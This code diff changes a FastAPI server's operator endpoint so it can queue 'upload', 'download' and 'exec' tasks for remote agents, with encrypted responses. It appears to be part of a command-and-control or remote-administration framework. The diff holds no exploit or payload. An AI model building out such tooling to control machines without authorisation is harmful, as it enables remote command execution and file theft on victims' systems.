@@ -155,12 +155,46 @@ async def submit_result(agent_id: str, request: Request):
     await manager.broadcast({"event": "task_updated", "agent_id": agent_id, "task_id": task_id})
     return {"data": encrypt_payload({"status": "received"})}
 
+from pydantic import BaseModel
+
+class TaskRequest(BaseModel):
+    agent_id: str
+    task_type: str
+    command: str = ""
+    payload: dict = None
+    expires_minutes: int = 60
+
 @app.post("/operator/tasks")
-async def create_task(agent_id: str, task_type: str, command: str, expires_minutes: int = 60, user: str = Depends(get_current_user)):
-    from datetime import timedelta
-    expires_at = datetime.utcnow() + timedelta(minutes=expires_minutes)
-    task_id = store.add_task(agent_id, task_type, {"command": command}, expires_at)
-    await manager.broadcast({"event": "task_created", "agent_id": agent_id, "task_id": task_id})
+async def create_task(req: TaskRequest, user: str = Depends(get_current_user)):
+    expires_at = datetime.utcnow() + timedelta(minutes=req.expires_minutes)
+    
+    # Use provided payload or build from command
+    task_payload = req.payload if req.payload else {"command": req.command}
+    
+    # Profiles logic (if only command provided)
+    if not req.payload:
+        if req.task_type == "upload" and ":" in req.command:
+            try:
+                local_path, remote_path = req.command.split(":", 1)
+                local_path, remote_path = local_path.strip(), remote_path.strip()
+                if os.path.exists(local_path):
+                    import base64
+                    with open(local_path, "rb") as f:
+                        content = base64.b64encode(f.read()).decode('utf-8')
+                    task_payload = {
+                        "filename": os.path.basename(local_path),
+                        "content": content,
+                        "path": remote_path
+                    }
+            except: pass
+        elif req.task_type == "download":
+            task_payload = {"path": req.command.strip()}
+        elif req.task_type == "exec":
+            parts = req.command.split(" ")
+            task_payload = {"command": parts[0], "args": parts[1:]}
+
+    task_id = store.add_task(req.agent_id, req.task_type, task_payload, expires_at)
+    await manager.broadcast({"event": "task_created", "agent_id": req.agent_id, "task_id": task_id})
     return {"status": "task_created", "task_id": task_id}
 
 @app.websocket("/ws")
